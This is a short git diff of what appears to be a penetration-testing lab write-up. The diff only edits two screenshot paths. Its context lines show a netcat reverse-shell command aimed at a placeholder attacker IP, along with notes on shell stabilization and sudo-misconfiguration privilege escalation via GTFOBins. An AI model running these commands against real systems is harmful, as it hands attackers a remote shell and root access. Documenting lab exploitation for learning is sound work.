@@ -147,7 +147,7 @@ nc <ATTACKER_IP> <PORT> -e /bin/bash
 ```
 
 <p align="center">
-  <img src="./Assets/06-netcat-reverse-shell.png" alt="Netcat reverse shell foothold" width="700">
+  <img src="./Assets/06-netcat-reverse-shell.png.png" alt="Netcat reverse shell foothold" width="700">
 </p>
 
 Shell stabilization was performed to move from a raw netcat listener to a fully interactive TTY:
@@ -172,7 +172,7 @@ sudo -l
 This revealed a sudo misconfiguration — a binary or command permitted to run as root without restriction, exploitable via [GTFOBins](https://gtfobins.github.io/)-style shell breakout to obtain a root shell.
 
 <p align="center">
-  <img src="./Assets/07-privilege-escalation-sudo.png" alt="Privilege escalation via sudo misconfiguration" width="700">
+  <img src="./Assets/07-privilege-escalation-sudo.png.png" alt="Privilege escalation via sudo misconfiguration" width="700">
 </p>
 
 ```bash
